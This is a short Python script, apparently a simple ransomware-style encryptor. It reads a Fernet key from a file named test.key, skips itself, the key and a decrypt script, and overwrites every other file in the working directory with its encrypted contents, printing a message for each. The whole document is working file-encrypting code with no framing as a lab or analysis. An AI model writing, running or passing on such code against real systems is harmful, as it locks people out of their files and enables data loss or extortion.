from cryptography.fernet import Fernet
import os

files = []

for i in os.listdir():
    if i == "main.py" or not os.path.isfile(i) or i == "test.key" or i == "decrypt.py":
        continue
    else:
        files.append(i)



with open('test.key','rb') as tk:
    
    key_value = tk.read()





for file in files:
    
    with open(file,'rb') as ofiles:
       
       encrypt_content = Fernet(key_value).encrypt(ofiles.read())
       
       with open(file,'wb') as oofile:
           
           oofile.write(encrypt_content)
           print(f'{file} has been encrypted !!!')
    
    
    

